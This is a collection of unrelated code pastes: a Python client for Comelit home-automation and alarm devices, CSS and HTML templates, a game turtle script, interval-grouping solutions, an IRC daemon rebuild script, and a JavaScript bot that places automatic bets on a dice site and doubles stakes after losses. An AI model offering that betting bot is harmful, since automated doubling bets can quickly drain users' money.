    val: int | dict[Any, Any]  # Temperature or Humidity (CLIMATE)
    protected: int
    zone: str
    power: float
    power_unit: str = WATT


@dataclass
class ComelitVedoAreaObject:
    """"""Comelit SimpleHome VEDO area class.""""""

    index: int
    name: str
    p1: bool
    p2: bool
    ready: bool
    armed: bool
    alarm: bool
    alarm_memory: bool
    sabotage: bool
    anomaly: bool
    in_time: bool
    out_time: bool
    human_status: AlarmAreaState


@dataclass
class ComelitVedoZoneObject:
    """"""Comelit SimpleHome VEDO zone class.""""""

    index: int
    name: str
    status_api: str
    status: int
    human_status: AlarmZoneState


class ComelitCommonApi:
    """"""Common API calls for Comelit SimpleHome devices.""""""

    def __init__(self, host: str, port: int, pin: int) -> None:
        """"""Initialize the session.""""""
        self.host = f""{host}:{port}""
        self.device_pin = pin
        self.base_url = f""http://{host}:{port}""
        self._headers = {
            ""User-Agent"": ""Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"",
            ""Accept-Language"": ""en-GB,en;q=0.5"",
            ""X-Requested-With"": ""XMLHttpRequest"",
            ""Connection"": ""keep-alive"",
        }
        self._session: aiohttp.ClientSession

    async def _get_page_result(
        self, page: str, reply_json: bool = True
    ) -> tuple[int, dict[str, Any]]:
        """"""Return status and data from a GET query.""""""
        _LOGGER.debug(""GET page %s [%s]"", page, self.host)
        timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
        url = f""{self.base_url}{page}&_={timestamp}""
        try:
            response = await self._session.get(
                url,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during GET"") from exc

        _LOGGER.debug(""GET response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""GET response status {response.status}"")

        if not reply_json:
            _LOGGER.debug(""GET response is empty [%s]"", self.host)
            return response.status, {}

        return response.status, await response.json()

    async def _post_page_result(
        self, page: str, payload: dict[str, Any]
    ) -> SimpleCookie:
        """"""Return status and data from a POST query.""""""
        _LOGGER.debug(""POST page %s [%s]"", page, self.host)
        url = f""{self.base_url}{page}""
        try:
            response = await self._session.post(
                url,
                data=payload,
                headers=self._headers,
                timeout=10,
            )
        except (asyncio.TimeoutError, aiohttp.ClientConnectorError) as exc:
            raise CannotConnect(""Connection error during POST"") from exc

        _LOGGER.debug(""POST response %s [%s]"", await response.text(), self.host)

        if response.status != 200:
            raise CannotRetrieveData(f""POST response status {response.status}"")

        return response.cookies

    async def _is_session_active(self) -> bool:
        """"""Check if aiohttp session is still active.""""""
        if not hasattr(self, ""_session"") or self._session.closed:
            return False

        return True

    async def _check_logged_in(self, host_type: str) -> bool:
        """"""Check if login is active.""""""

        reply_status, reply_json = await self._get_page_result(""/login.json"")

        _LOGGER.debug(""%s login reply: %s"", host_type, reply_json)
        if host_type == BRIDGE:
            logged = reply_json[""domus""] != ""000000000000""
        else:
            logged = reply_json[""logged""] == 1

        return logged

    async def _sleep_between_call(self, seconds: float) -> None:
        """"""Sleep between one call and the next one.""""""
        _LOGGER.debug(""Sleeping for %s seconds before next call"", seconds)
        await asyncio.sleep(seconds)

    @abstractmethod
    async def login(self) -> bool:
        """"""Login to Comelit device.""""""

    async def _login(self, payload: dict[str, Any], host_type: str) -> bool:
        """"""Login into Comelit device.""""""
        _LOGGER.debug(""Logging into host %s [%s]"", self.host, host_type)

        if not await self._is_session_active():
            _LOGGER.debug(""Creating HTTP ClientSession"")
            jar = aiohttp.CookieJar(unsafe=True)
            connector = aiohttp.TCPConnector(force_close=True)
            self._session = aiohttp.ClientSession(cookie_jar=jar, connector=connector)

        if await self._check_logged_in(host_type):
            return True

        cookies = await self._post_page_result(""/login.cgi"", payload)
        _LOGGER.debug(""Cookies for host %s: %s"", self.host, cookies)

        if not cookies:
            _LOGGER.warning(
                ""Authentication failed for host %s [%s]: no cookies received"",
                self.host,
                host_type,
            )
            raise CannotAuthenticate

        self._session.cookie_jar.update_cookies(cookies, URL(self.base_url))

        return await self._check_logged_in(host_type)

    async def logout(self) -> None:
        """"""Comelit Simple Home logout.""""""
        if await self._is_session_active():
            payload = {""logout"": 1}
            await self._post_page_result(""/login.cgi"", payload)
            self._session.cookie_jar.clear()

    async def close(self) -> None:
        """"""Comelit Simple Home close session.""""""
        if await self._is_session_active():
            await self._session.close()


class ComeliteSerialBridgeApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome Serial bridge.""""""

    def __init__(self, host: str, port: int, bridge_pin: int) -> None:
        """"""Initialize the session.""""""
        super().__init__(host, port, bridge_pin)
        self._devices: dict[str, dict[int, ComelitSerialBridgeObject]] = {}
        self._last_clima_command: datetime | None = None
        self._semaphore = asyncio.Semaphore()

    async def _translate_device_status(self, dev_type: str, dev_status: int) -> str:
        """"""Makes status human readable.""""""

        if dev_type == COVER:
            return STATE_COVER[dev_status]

        return ""on"" if dev_status == STATE_ON else ""off""

    async def set_clima_status(self, index: int, action: str, temp: float = 0) -> bool:
        """"""Set clima status.

        action:
            auto, man, on, off, set

        """"""
        await self._semaphore.acquire()
        if self._last_clima_command:
            delta_seconds = SLEEP_BETWEEN_BRIDGE_CALLS - round(
                (datetime.now() - self._last_clima_command).total_seconds(), 2
            )
            if delta_seconds > 0:
                _LOGGER.debug(
                    ""Climate calls needs to be queued (%ss) for proper execution"",
                    delta_seconds,
                )
                await self._sleep_between_call(delta_seconds)

        reply_status = await self._get_page_result(
            f""/user/action.cgi?clima={index}&thermo={action}&val={int(temp*10)}"", False
        )
        self._last_clima_command = datetime.now()
        self._semaphore.release()
        return reply_status == 200

    async def set_device_status(
        self, device_type: str, index: int, action: int
    ) -> bool:
        """"""Set device action.

        action:
            0 = off/close
            1 = on/open

        """"""
        reply_status = await self._get_page_result(
            f""/user/action.cgi?type={device_type}&num{action}={index}"", False
        )
        return reply_status == 200

    async def get_device_status(self, device_type: str, index: int) -> int:
        """"""Get device status.""""""
        reply_status, reply_json = await self._get_page_result(
            f""/user/icon_status.json?type={device_type}""
        )
        _LOGGER.debug(
            ""Device %s[%s] status: %s"", device_type, index, reply_json[""status""][index]
        )
        return reply_json[""status""][index]

    async def login(self) -> bool:
        """"""Login to Serial Bridge device.""""""
        payload = {""dom"": self.device_pin}
        return await self._login(payload, BRIDGE)

    async def get_all_devices(self) -> dict[str, dict[int, ComelitSerialBridgeObject]]:
        """"""Get all connected devices.""""""

        _LOGGER.debug(""Getting all devices for host %s"", self.host)

        loop = asyncio.get_running_loop()
        ureg = await loop.run_in_executor(
            None, functools.partial(pint.UnitRegistry, cache_folder="":auto:"")
        )
        ureg.default_format = ""~""

        for dev_type in (CLIMATE, COVER, LIGHT, IRRIGATION, OTHER, SCENARIO):
            reply_status, reply_json = await self._get_page_result(
                f""/user/icon_desc.json?type={dev_type}""
            )
            _LOGGER.debug(
                ""List of devices of type %s: %s"",
                dev_type,
                reply_json,
            )
            reply_counter_json: dict[str, Any] = {}
            if dev_type == OTHER and reply_json[""num""] > 0:
                reply_status, reply_counter_json = await self._get_page_result(
                    ""/user/counter.json""
                )
            devices = {}
            for i in range(reply_json[""num""]):
                # Guard against ""scenario"", that has 32 devices even if none is configured
                if reply_json[""desc""][i] == """":
                    continue
                status = reply_json[""status""][i]
                power = 0.0
                if instant_values := reply_counter_json.get(""instant""):
                    instant = ureg(instant_values[i])
                    if not instant.dimensionless:
                        power = ureg.convert(
                            instant.magnitude, str(instant.units), WATT
                        )
                dev_info = ComelitSerialBridgeObject(
                    index=i,
                    name=reply_json[""desc""][i],
                    status=status,
                    human_status=await self._translate_device_status(dev_type, status),
                    type=dev_type,
                    val=reply_json[""val""][i],
                    protected=reply_json[""protected""][i],
                    zone=reply_json[""env_desc""][reply_json[""env""][i]]
                    if not dev_type == SCENARIO
                    else """",
                    power=power,
                )
                devices.update({i: dev_info})
            self._devices.update({dev_type: devices})

        return self._devices


class ComelitVedoApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome VEDO alarm.""""""

    _json_data: list[dict[Any, Any]] = [{}, {}, {}, {}, {}]

    async def _translate_zone_status(
        self, zone: ComelitVedoZoneObject
    ) -> AlarmZoneState:
        """"""Translate ZONE status.""""""

        for status in ALARM_ZONE_STATUS:
            if zone.status & status != 0:
                return ALARM_ZONE_STATUS[status]

        return AlarmZoneState.REST

    async def _translate_area_status(
        self, area: ComelitVedoAreaObject
    ) -> AlarmAreaState:
        """"""Translate AREA status.""""""

        for field in ALARM_AREA_STATUS:
            if getattr(area, field):
                return ALARM_AREA_STATUS[field]

        return AlarmAreaState.DISARMED

    async def _create_area_object(
        self, json_area_desc: dict[str, Any], json_area_stat: dict[str, Any], index: int
    ) -> ComelitVedoAreaObject:
        """"""Get area status.""""""

        area = ComelitVedoAreaObject(
            index=index,
            name=json_area_desc[""description""][index],
            p1=json_area_desc[""p1_pres""][index],
            p2=json_area_desc[""p2_pres""][index],
            ready=json_area_stat[""ready""][index],
            armed=json_area_stat[""armed""][index],
            alarm=json_area_stat[""alarm""][index],
            alarm_memory=json_area_stat[""alarm_memory""][index],
            sabotage=json_area_stat[""sabotage""][index],
            anomaly=json_area_stat[""anomaly""][index],
            in_time=json_area_stat[""in_time""][index],
            out_time=json_area_stat[""out_time""][index],
            human_status=AlarmAreaState.UNKNOWN,
        )
        area.human_status = await self._translate_area_status(area)
        _LOGGER.debug(area)
        return area

    async def _create_zone_object(
        self, json_zone_desc: dict[str, Any], json_zone_stat: dict[str, Any], index: int
    ) -> ComelitVedoZoneObject:
        """"""Create zone object.""""""

        status_api = json_zone_stat[""status""].split("","")[index]

        zone = ComelitVedoZoneObject(
            index=index,
            name=json_zone_desc[""description""][index],
            status=int(status_api, 16),
            status_api=status_api,
            human_status=AlarmZoneState.UNKNOWN,
        )
        zone.human_status = await self._translate_zone_status(zone)
        _LOGGER.debug(zone)
        return zone

    async def _async_get_page_data(
        self, desc: str, page: str, present_check: str | int | None = None
    ) -> tuple[bool, dict[str, Any]]:
        """"""Return status and data from a specific GET query.""""""
        reply_status, reply_json = await self._get_page_result(page)
        _LOGGER.debug(""Alarm %s: %s"", desc, reply_json)
        present = present_check in reply_json[""present""] if ""_desc"" in page else True
        return (reply_json[""logged""] and present), reply_json

    async def set_zone_status(
        self, index: int, action: str, force: bool = False
    ) -> bool:
        """"""Set zone action.

        action:
            tot = enable
            dis = disable

        index:
            32 = all zones
             n = specific zone

        force:
            False = don't force action
            True  = force action

        """"""

        reply_status = await self._get_page_result(
            f""/action.cgi?vedo=1&{action}={index}&force={int(force)}"", False
        )
        return reply_status == 200

    async def login(self) -> bool:
        """"""Login to VEDO system.""""""
        payload = {""code"": self.device_pin}
        return await self._login(payload, VEDO)

    async def get_area_status(
        self, area: ComelitVedoAreaObject
    ) -> ComelitVedoAreaObject:
        """"""Get AREA status.""""""

        reply_status, reply_json_area_stat = await self._async_get_page_data(
            ""AREA statistics"", ""/user/area_stat.json""
        )
        description = {""description"": area.name, ""p1_pres"": area.p1, ""p2_pres"": area.p2}

        return await self._create_area_object(
            description, reply_json_area_stat, area.index
        )

    async def get_all_areas_and_zones(
        self,
    ) -> dict[str, dict[int, Any]]:
        """"""Get all VEDO system AREA and ZONE.""""""

        queries: dict[int, dict[str, Any]] = {
            1: {
                ""desc"": ""AREA description"",
                ""page"": ""/user/area_desc.json"",
                ""present"": 1,
            },
            2: {
                ""desc"": ""ZONE description"",
                ""page"": ""/user/zone_desc.json"",
                ""present"": ""1"",
            },
            3: {
                ""desc"": ""AREA statistics"",
                ""page"": ""/user/area_stat.json"",
                ""present"": None,
            },
            4: {
                ""desc"": ""ZONE statistics"",
                ""page"": ""/user/zone_stat.json"",
                ""present"": None,
            },
        }

        for index, info in queries.items():
            desc = info[""desc""]
            page = info[""page""]
            present = info[""present""]
            if ""_desc"" in page and self._json_data[index]:
                _LOGGER.debug(""Data for %s already retrieved, skipping"", desc)
                continue
            await self._sleep_between_call(SLEEP_BETWEEN_VEDO_CALLS)
            reply_status, reply_json = await self._async_get_page_data(
                desc, page, present
            )
            if not reply_status:
                _LOGGER.info(""Login expired accessing %s, re-login attempt"", desc)
                await self.login()
                await self._sleep_between_call(SLEEP_BETWEEN_VEDO_CALLS)
                reply_status, reply_json = await self._async_get_page_data(
                    desc, page, present
                )
                if not reply_status:
                    raise CannotRetrieveData(
                        ""Login expired and not working after a retry""
                    )
                _LOGGER.info(""Re-login successful"")
            self._json_data.insert(index, reply_json)

        list_areas: list[int] = self._json_data[1][""present""]
        areas = {}
        for i in range(len(list_areas)):
            if not list_areas[i]:
                _LOGGER.debug(""Alarm skipping non present AREA [%i]"", i)
                continue
            area = await self._create_area_object(
                self._json_data[1], self._json_data[3], i
            )
            areas.update({i: area})

        list_zones: list[int] = self._json_data[2][""present""]
        zones = {}
        for i in range(len(list_zones)):
            if not int(list_zones[i]):
                _LOGGER.debug(""Alarm skipping non present ZONE [%i]"", i)
                continue
            zone = await self._create_zone_object(
                self._json_data[2], self._json_data[4], i
            )
            zones.update({i: zone})

        return {ALARM_AREAS: areas, ALARM_ZONES: zones}
"
BbfAsx1f,tabchange,kerlser,CSS,Monday 5th of February 2024 01:48:37 AM CDT,"

                                                                                                                       /*  change  */

.tab-icon-stack {
   /*margin: 0;
    padding: 0;*/
     color: blue !important;
}

                                                                                                                       /*  change  */

.tab-content:not([selected]) > :not(.tab-icon-stack){
    display: none;
  }

.tab-content {
    box-sizing: border-box;
    
    clear: both;
}

/* Hide Title when not focus */

                                                         /* wrong attribute, disable / delete  */

 /*.tabbrowser-tab[fadein][visuallyselected=""false""] { min-width: calc(16px + 2 * 10px + 4px) !important; }*/

.tab-content:after{
  content: """";
    display: table;
    clear: both;
}
  .tab-icon-image:not([src]){
    display: block !important;
  }

                                                                                                                       /*  change  */

  .tab-icon-stack:not([selected]) > *{ margin-inline: 0 !important; }

.tabbrowser-tab[fadein] {
    flex-grow: 0 !important;
  }

                                                                                                                       /*  change  */

  .tabbrowser-tab[fadein]:not([visuallyselected])    { min-width: calc(16px + 2 * 10px + 4px) !important; }


  :root[uidensity=""compact""] .tabbrowser-tab[fadein]:not([visuallyselected]) {
    min-width: calc(16px + 2 * var(--inline-tab-padding,0px) + 4px) !important;
  }


  :root:not([uidensity=""compact""]) .tab-content{ padding-inline: 10px !important; }


  /* Hide users icon vol*/
  /* Hide Icons */
.tab-icon-overlay {
  display: none;
}
.tab-icon-image {
  opacity: 1 !important;
}

"
pb4FQhXK,profile 10 (2.2.24 xl),vermilly,HTML,Monday 5th of February 2024 12:50:40 AM CDT,"<!------
    
    【F2U】 53.Live [ Dark. ]
    
      // Code by Leporidebug

      //// COLORS ////
      
      main accent → ed3958
      text color → d4d4d4
      button → d42242
      blacks → 000000
      whites → ffffff
      
      
------>

<div class=""card mx-auto mt-4 p-1"" style=""max-width:700px;border-radius:0.5rem;background-color:#000000;font-family:'avenir';"">
  
  <!--------------------------------
  
      | MAIN BACKGROUND
  
  ---------------------------------->
  <div class=""row no-gutters rounded modal-open"" style=""background-size:cover;background-position:center;
    
    /*----- main background ; autoscale center, replace IMG_URL with image address -----*/;
    background-image:url(https://i.pinimg.com/564x/60/c2/bc/60c2bcfd3cf68f97421af6a3b82ff9ad.jpg);
  
  "">
    
    <!--------------------------------
  
      | LEFT BOX
      
        - name and music player
  
    ---------------------------------->
    <div class=""col-lg col-12 flex-column"">
      <div class=""card border-0 p-1"" style=""height:330px;background-color:transparent;"">
        <!----- name box ----->
        <div class=""card border-0 p-2"" style=""background-color:rgba(0,0,0,0.8);max-width:250px;box-shadow:0 0 8px rgba(0,0,0,0.3)"">
          <div class=""row no-gutters"">
            
            <!----- avatar image ----->
            <div class=""col-auto my-auto"">
              <div class=""card rounded-circle"" style=""width:50px;height:50px;background-color:transparent;border-color:#ffffff;border-width:2px;background-size:cover;background-position:center;
                
                /*----- user avatar ; replace IMG_URL with image address -----*/;
                background-image:url(https://i.pinimg.com/564x/c6/c0/40/c6c0401278a3088d8bc3cb97e85d21e5.jpg);
                
              ""></div>
            </div>
            
            <!----- name ----->
            <div class=""col pl-3 my-auto"">
              <h1 class=""text-uppercase font-weight-bold mb-0"" style=""letter-spacing:1px;color:#ed3958;"">
                
                XUXU ✧･ﾟ
                
              </h1>
              <p class=""small"" style=""color:#d4d4d4;"">
                
                @ xuxu
                
              </p>
            </div>
          </div>
        </div>
        <!----- name box ----->
        
        <!----- filler box to push music player to bottom, no need to edit ----->
        <div class=""card border-0 d-flex flex-fill"" style=""background:transparent;""></div>
        
        <!----- music player ----->
        <div class=""container"">
          <div class=""row no-gutters"">
            <!----- play button ----->
            <div class=""col-auto my-auto"">
              
              <!----- replace OgCj6OpPbAw with the part of URL after [https://www.youtube.com/watch?v=] ----->
              <a href="""" style=""text-decoration:none;color:#ffffff;text-shadow:0 0 3px rgba(0,0,0,0.5);"">
                <iframe frameborder=""0"" style=""height:1rem;width:1rem;position:absolute;opacity:0.002""
            
                  src=""https://www.youtube.com/embed/j3oBf3oBvrw""

                ></iframe>
                
                <!----- fontawesome icon here ----->
                <i class=""fas fa-play fa-fw""></i>
                
              </a>
            </div>
            
            <!----- artist info ----->
            <div class=""col my-auto px-1"">
              <p class=""small text-uppercase"" style=""color:#ffffff;text-shadow:0 0 3px rgba(0,0,0,0.5);"">
                
KILL ME IN JERUSALEM                 
              </p>
            </div>
          </div>
        </div>
        <!----- music player end ----->
        
      </div>
    </div>
    <!----- LEFT BOX END ----->
    
    
    <!----- filler box between two boxes, no need to edit ----->
    <div class=""col-lg-auto col-12 flex-column"">
      <div class=""card border-0 rounded-0 p-1 d-flex flex-fill"" style=""background-color:#000000;""></div>
    </div>
    
    
    <!--------------------------------
  
      | RIGHT BOX
      
        - main profile
  
    ---------------------------------->
    <div class=""col-lg-4 col-12 flex-column"">
      
      <!-----------------------------------
      
        scrollable ""chat""-styled profile
      
      ------------------------------------->
      <div class=""card border-0 d-flex flex-fill rounded-0 p-3"" style=""background-color:rgba(0, 0, 0, 0.5);min-height:100px;max-height:300px;overflow:auto;"">
          
          
        <!----- basics ---->
        <div class=""card border-0 p-3 small mb-2"" style=""background-color:rgba(0,0,0,0.9);max-width:250px;box-shadow:0 0 8px rgba(0,0,0,0.3);color:#d4d4d4;"">
          
          <p>18+ . they/them . pst . 🇦🇫 🇺🇸
          <br>
            
        <!----- socials ----->
          
          <!----- carrd ----->
          <a href=""https://xuxu-time.carrd.co/"" title=""carrd"" class=""tooltipster"" data-placement=""bottom"" style=""text-decoration:none;color:#ed3958;"">
            <i class=""fas fa-id-card fa-sm fa-fw""></i>
          </a>  
          
 
          <!----- discord ----->
          <!----- replace username#0000 ----->
          <a title=""dr.xuxu"" class=""tooltipster"" style=""text-decoration:none;color:#ed3958;"" data-placement=""bottom"">
            <i class=""fab fa-discord fa-sm fa-fw""></i>
          </a>
          
          <!----- add or delete as needed ----->
          
        </p>
        <!----- social end ----->
          
        </div>
        <!----- basics end ---->
        
        
        <!----- intro box ---->
        <div class=""card border-0 p-3 small mb-2"" style=""background-color:#ed3958;max-width:250px;box-shadow:0 0 8px rgba(0,0,0,0.3);color:#ffffff;"">
          
          <!----- header ---->
          <div class=""row no-gutters"">
            <!----- greeting ---->
            <div class=""col my-auto"">
              <h4 class=""mb-0 font-weight-bold text-uppercase"">
                
                WHAT'S UP,
              
              </h4>
            </div>
            
            <!----- avatar image (again) ---->
            <div class=""col-auto"">
              <div class=""card rounded-circle mb-1"" style=""width:30px;height:30px;background-color:transparent;border-color:#ffffff;border-width:2px;background-size:cover;background-position:center;
              
                /*----- user avatar ; replace IMG_URL with image address -----*/;
                background-image:url(https://64.media.tumblr.com/dcdd9120f1d178daf3059887c86475d2/37f37deabac96f53-6d/s500x750/1ca716493fb319865501a7976a083d5c1d3582e8.jpg);
                
              ""></div>
            </div>
            
          </div>
          <!----- header end ---->
          
          <!----- intro content ---->
          <p>
            ...babes, bros, and nonbinary crows~! I'm Xuxu, a digital artist & undergrad psych student with very low energy levels. I love Twisted Wonderland and TGCF. 
          </p>
        </div>
        <!----- intro box end ---->
        
        
        <!----- art status ---->
        <div class=""card border-0 p-3 small mb-2"" style=""background-color:rgba(0,0,0,0.9);max-width:250px;box-shadow:0 0 8px rgba(0,0,0,0.3);color:#d4d4d4;"">
          
          <p>""But who prays for Satan? Who, in eighteen centuries, has had the common humanity to pray for the one sinner that needed it most?""</p>
        
            
            <!----- add more as needed ---->
            
          </ul>
          
        </div>
        
        
      </div>
      <!----- chat profile end ----->
      
      
      <!-----------------------------------
      
        message and socials
      
      ------------------------------------->
      <div class=""card pt-2 rounded-0 border-0 d-flex flex-fill"" style=""background-color:#000000;"">
        
        <!----- send message ----->
        <div class=""card border-0 modal-open mb-1"" style=""border-radius:1.5rem;"">
          <div class=""row no-gutters"">
            <!----- message box ----->
            <div class=""col-9 flex-column"">
            <div class=""card px-2 py-1 rounded-0 border-0 flex-fill"" style=""background-color:#d4d4d4;color:#000000;"">
                
                <!----- message content ----->
               
                <p class=""small my-auto faded"">
                  
""san lang, join me!""              </p>
              </div>
            </div>
            <!----- message box end ----->
            
            <!----- send button ----->
            <div class=""col-3 flex-column"">
              <!----- replace username with your own ----->
              <a
                href=""https://drawing.garden/""
                title=""join xie lian!""
                
                class=""w-100 btn rounded-0 border-0 d-flex flex-fill mx-auto my-auto tooltipster"" style=""color:#ffffff;background-color:#d42242;"">
                
                  <!----- fontawesome icon ----->
                  <i class=""fas fa-paper-plane fa-fw"" style=""font-size:0.75rem;""></i>
                  
              </a>
            </div>
            <!----- send button end ----->
          </div>
        </div>
        <!----- send message end ----->
        
        
      
      </div>
      <!----- message and socials end ------>
    </div>
    <!----- RIGHT BOX END ----->
  </div>
</div>
<!----- MAIN CONTENT END ----->
<!----- CREDIT ! please do not remove ----->
<p class=""text-center faded mx-auto mb-4"" style=""max-width:700px;"">
  <a href=""https://toyhou.se/19722685"" class=""small text-muted"" style=""text-decoration:none;"">code by Leporidebug</a>
</p>
<!----- [ CODE END ] ----->"
AxRhjUEC,BloodAltar_bot_v3,Arphahat,Lua,Monday 5th of February 2024 12:36:47 AM CDT,"input_slot = 1      -- location in inventory that the turtle uses to grab an item to place
checking_slot = 15  -- locaiton in inventory that the turtle sucks an item to check if it is complete
target_slot = 16    -- location in inventory that the turtle compares an item against to see if it is complete
output_slot = 2     -- location in inventory that the final output is placed
error_slot = 3		-- location in inventory that the final output is placed if output_slot is full of something else

function IsDone()
	local done = false
	if turtle.getItemCount(target_slot) > 0 then -- only compares to target_slot if something in target_slot
		turtle.select(checking_slot)
		turtle.suck()
		if turtle.compareTo(target_slot) then -- compare the new item to the target item
			-- items match, we're done
			turtle.transferTo(output_slot) -- move to final location
			done = true
		else
			-- not done, put it back in and continue
			turtle.drop()			
		end
	else
		turtle.select(output_slot)
		turtle.suck()
		done = true
	end	
	return done	
end

-- main program
turtle.select(input_slot)
if turtle.getItemCount(input_slot) > 0 then
	turtle.drop(1)
	while true do
	 local lamp = rs.AnalogInput(""front"")
	 if lamp == 15 then -- only check when done is triggered
		 if IsDone() then
			turtle.select(input_slot)
			if turtle.getItemCount() == 0 then -- if input_slot is empty, break the loop and end program.
				break
			end
			-- if slot isn't empty, insert the next one
			turtle.drop(1)
		end
	end
end
write(""Input slot is empty.\n"")"
8M7c4ZMS,snowybot 7777,coinwalk,JavaScript,Monday 5th of February 2024 12:31:40 AM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = ((original/240).toFixed(7));
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var mighty = (hectic*blast);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    mighty = (hectic*blast);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;  
    telf = parseFloat(bilance);
}
if (((surigret*20)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
4pBBeHNf,sovr_python,crowwhite,Python,Sunday 4th of February 2024 11:43:54 PM CDT,"from collections import namedtuple
from operator import attrgetter

Person = namedtuple('Person', ['start', 'end', 'id'])


def find_maximal_groups(people):
    events = []
    for person in people:
        events.append((person.start, 1, person.id))
        events.append((person.end, -1, person.id))
    events.sort()

    max_count = 0
    count = 0
    max_groups = []
    current_group = set()
    flag = False
    last_count = 0
    for time, delta, id in events:
        if delta == 1:
            current_group.add(id)
        else:
            flag = True
            current_group.remove(id)
        count += delta
        if count >= last_count:
            if flag:
                max_groups.append(set(current_group))
            else:
                if len(max_groups) > 0:
                    max_groups[-1] = set(current_group)
                else:
                    max_groups.append(set(current_group))
            flag = False
        last_count = count
    return max_groups


N = int(input())
people = []
for i in range(N):
    bd, bm, by, dd, dm, dy = map(int, input().split())
    birth = by * 10000 + bm * 100 + bd
    death = dy * 10000 + dm * 100 + dd
    if birth + 18 * 10000<min(death, birth + 80 * 10000):
        people.append(Person(birth + 18 * 10000, min(death, birth + 80 * 10000), i + 1))

max_groups = find_maximal_groups(people)
if len(max_groups)>0:
    for group in max_groups:
        print(' '.join(map(str, sorted(group))))
else:
    print(0)
"
gM3TJJ0z,ircd update,kofany,Bash,Sunday 4th of February 2024 11:43:36 PM CDT,"#!/bin/bash

read -p ""Podaj prefix instalacyjny [domyślnie: /home/ircd/ircd]: "" PREFIX
PREFIX=${PREFIX:-/home/ircd/ircd}

cd
pushd $HOME
if [[ -f ircd.conf ]]; then
    echo -e ""Stary plik ircd.conf obecny, usuwam.""
    rm -rf ircd.conf
fi
if [[ -f ircd.motd ]]; then
    echo -e ""Stary plik ircd.motd obecny, usuwam.""
    rm -rf ircd.motd
fi
sleep 1
echo -e ""Kopiuję pliki ircd.conf i ircd.motd""

cp ""${PREFIX}/etc/ircd.motd"" ""$HOME/ircd.motd""
cp ""${PREFIX}/etc/ircd.conf"" ""$HOME/ircd.conf""
sleep 1
if [[ -f ircd.conf ]]; then
    echo -e ""Plik ircd.conf obecy""
else
    echo -e ""Brak pliku ircd.conf w folderze domowym, sprawdź ręcznie""
    exit 1
fi
if [[ -f ircd.motd ]]; then
    echo -e ""Plik ircd.motd obecy""
else
    echo -e ""Brak pliku ircd.motd w folderze domowym, sprawdź ręcznie""
    exit 1
fi

if [[ -d ""${PREFIX}"" ]]; then
    echo -e ""Usuwam stary folder ircd""
    rm -rf ""${PREFIX}""
fi
if [[ -d $HOME/ircwars ]]; then
    echo -e ""Usuwam stary folder ircwars""
    rm -rf $HOME/ircwars
fi
sleep 1
echo -e ""Pobieram ircWars z repo""
git clone https://github.com/kofany/ircwars
sleep 1
pushd $HOME/ircwars/
sleep 1
echo -e ""Wykonuję configure""
./configure --enable-ip6 --prefix=""${PREFIX}""
sleep 5
pushd ""$HOME/ircwars/x86_64-unknown-linux-gnu/""
echo -e ""Wykonuję make all""
sleep 5
make all
echo -e ""Wykonuję make install""
make install

echo -e ""Kopiuję pliki ircd.conf i ircd.motd do ircd/etc""

cp ""$HOME/ircd.motd"" ""${PREFIX}/etc/ircd.motd""
cp ""$HOME/ircd.conf"" ""${PREFIX}/etc/ircd.conf""

pushd ""${PREFIX}/sbin/""
sleep 1
echo -e ""restartuję ircd""
killall -9 ircd
./ircd
"
ubi0hNi5,sovr_java,crowwhite,Java,Sunday 4th of February 2024 11:42:38 PM CDT,"import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.stream.Collectors;

import static java.lang.Math.min;

public class Main {

    public static ArrayList<HashSet<Long>> find_maximal_groups(ArrayList<long[]> people) {
        int n = people.size();
        if (n == 0) {
            return new ArrayList<>();
        }
        ArrayList<long[]> events = new ArrayList<>();
        for (long[] person : people) {
            events.add(new long[]{person[0], 1, person[2]});
            events.add(new long[]{person[1], -1, person[2]});
        }
        events.sort(Comparator.comparing(a -> a[0]));
        ArrayList<HashSet<Long>> maxGroups = new ArrayList<>();
        HashSet<Long> current = new HashSet<>();
        long count = 0;
        boolean flag = false;
        long last_count = 0;
        for (long[] event : events) {
            long delta = event[1];
            long id = event[2];
            if (delta == 1) {
                current.add(id);
            } else {
                flag = true;
                current.remove(id);
            }
            count += delta;
            if (count >= last_count) {
                if (flag) {
                    maxGroups.add(new HashSet<>(current));
                } else {
                    if (!maxGroups.isEmpty()) {
